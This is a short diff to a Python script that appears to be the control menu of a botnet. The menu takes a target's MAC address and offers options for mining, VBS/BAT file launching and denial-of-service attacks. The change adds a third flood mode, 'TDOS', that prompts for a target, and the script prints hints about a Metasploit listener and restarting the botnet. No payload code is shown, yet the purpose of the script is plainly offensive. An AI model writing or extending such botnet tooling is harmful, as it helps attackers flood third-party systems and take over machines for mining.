@@ -15,12 +15,12 @@ if os.path.exists(file_to_delete):
 
 while True:
     mac = input("Enter Mac: ")
-    option = input("(START/STOP/STARTVBSBAT/MINING/DDOS/UDOS) : ")
+    option = input("(START/STOP/STARTVBSBAT/MINING/DDOS/UDOS/TDOS) : ")
     if option == "START":
         print("Use Metasploit Tool in | LPORT : 8070 | LHOST : 127.0.0.1")
     elif option == "STOP":
         print("STOP ALL SERVICE!, Restarting Botnet >>>")
-    elif option == "DDOS" or option == "UDOS":
+    elif option == "DDOS" or option == "UDOS" or option == "TDOS":
         target = input("Target >>> : ")  # Prompt for target input
     elif option == "STARTVBSBAT":
         print("START VBS + BAT FILE")
